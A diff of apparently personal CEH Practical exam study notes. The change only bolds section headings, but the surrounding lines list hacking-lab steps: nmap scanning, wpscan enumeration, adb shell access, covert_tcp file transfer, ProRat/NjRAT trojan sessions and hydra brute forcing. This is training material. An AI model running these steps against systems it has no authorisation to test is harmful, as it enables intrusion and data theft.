@@ -14,7 +14,7 @@ Tools
 11.	SQL Injection / nslookup/sqlmap/nikto
 12.	Android Debugging Bridge (adb)
 # PRACTICAL TIME
-1.	Network Scanning & Vulnerability Assessment
+1.	**Network Scanning & Vulnerability Assessment**
 •	Find Live hosts (nmap /netdiscover)
 	Sudo nmap [IP address] – for exam (CEH Practical)
 o	Sudo nmap –sC –sV –v –A –p– –O –T4 [IP Address range] – more aggressive deep scanning
@@ -23,7 +23,7 @@ o	Sudo nmap –sP 192.168.1.*:- when scanning a large network
 
 •	Find open ports & services running on those ports (nmap)
 	Sudo nmap –sC –sV –v –p– –T4 [IP Address range]
-2.	Enumeration
+2.	**Enumeration**
 •	ftp port 21 – used to transfer files between computers (file sharing)
 o	check IP to see which is running ftp
 	nmap –sC –p 21 [IP address]
@@ -75,7 +75,7 @@ o	Check ip first by ip a
 o	Nmap –sP [IP address]
 o	Nmap –sV --script nbstat.nse [IP address]
 
-3.	Hacking Web Application & Android 
+3.	**Hacking Web Application & Android** 
 •	Wpscan
 o	Wpscan in Kali Linux Wpscan –h will show you all the commands you can use
 o	Wpscan –url [copy url http://192.168.0.1] --enumerate u  (u for users) 
@@ -99,14 +99,14 @@ o	adb shell ( you are in the device )
 o	hit ls to see where you are in the device
 o	cd sdcard/
 o	cat secrete.txt
-4.	Traffic Sniffing
+4.	**Traffic Sniffing**
 •	Wireshark
 Pcap analysis – Filtering packets
 o	tcp.flags.syn
 o	Follow streams red part is our request and the blue part is the server response
 o	To see if there is a txt file – export object got to file, export object of http and save it 
 (DOS, DDOS)
-5.	Steganography
+5.**	Steganography**
 •	SNOW – for hiding and extracting hidden data from a text file
 o	Open SNOW.EXE (NB. you have to write in uppercase)–C (compile) –m “this is the secret message” –p ‘’give the password any’’ Secret.txt (this is the secrete file) Hiddensecret.txt (is the file you want to be the output)
 o	To extract the hidden file-: SNOW.EXE –C -p “given password any” Hiddensecret.txt and then hit enter.
@@ -122,7 +122,7 @@ o	Then ~/Downloads/Covert_tcp $ ls there will be 3 files covert_tcp, covert_tcp.
 o	Enter a command: cc –a covert_tcp covert_tcp.c 
 o	  ./covert_tcp  –source [IP Addrr e.g. 192.168.1.1] ( source Ip)  –dest [IP Addrr] (destination IP) –source_port 9999 ( set any port) –dest_port 8888 –file secret.txt  -: this is done from source computer
 o	./covert_tcp  –source [IP Addrr: 192.168.1.1] ( source Ip)  -source_port 8888 –server –file receive.txt (received file as)
-6.	Cryptography – practice of securing information so that it’s only accessible to authorised users only. The goal is to protect sensitive information
+**6.	Cryptography – practice of securing information so that it’s only accessible to authorised users only. The goal is to protect sensitive information**
 •	HashMyfiles - calculating and comparing hashes of files
 o	Open the tool 
 o	Drag and drop the files to the HashMyfiles application
@@ -142,7 +142,7 @@ o	Open app and hit create volume option
 o	Create an encrypted file container
 o	Hidden volume then normal mode then next & select folder then C:\ then file name NB mouse hover hover
 o	Go to  App, select mount to retrieve information of the hidden partition, this is do  
-7.	RAT – Remote Access Trojans (ProRat & NjRAT) 
+7.	**RAT – Remote Access Trojans (ProRat & NjRAT) **
 o	If you try and you are getting a response “no connection” it means maybe you have chosen the wrong machine to target or he port you have selected is the wrong one. Or the server is of different tool and you are using a different tool.
 o	Using ProRat you open it using attacker machine using the IP address of the victim machine use the default port
 o	Click connect and insert password. The password is provided if ProRat is used but if there is no password it means you use either HTTP RAT or NjRAT and you brute force.
@@ -157,7 +157,7 @@ o	Share the file on the share folder (Desktop)then go to the server victim machi
 o	Run the .EXE file 
 o	Switch back to attacker ,machine and you can see the session has been opened 
 o	You can right click on the session and use even RDP 
-8.	Privilege escalation
+8.	**Privilege escalation**
 o	ssh user1@[IP Addrr] –p(port) hit Y to agree and then enter the password you are provided or use hydra to brute force the password
 o	If you hit the command whoami it shows you the user
 o	 Sudo –L it shows you which users are there 
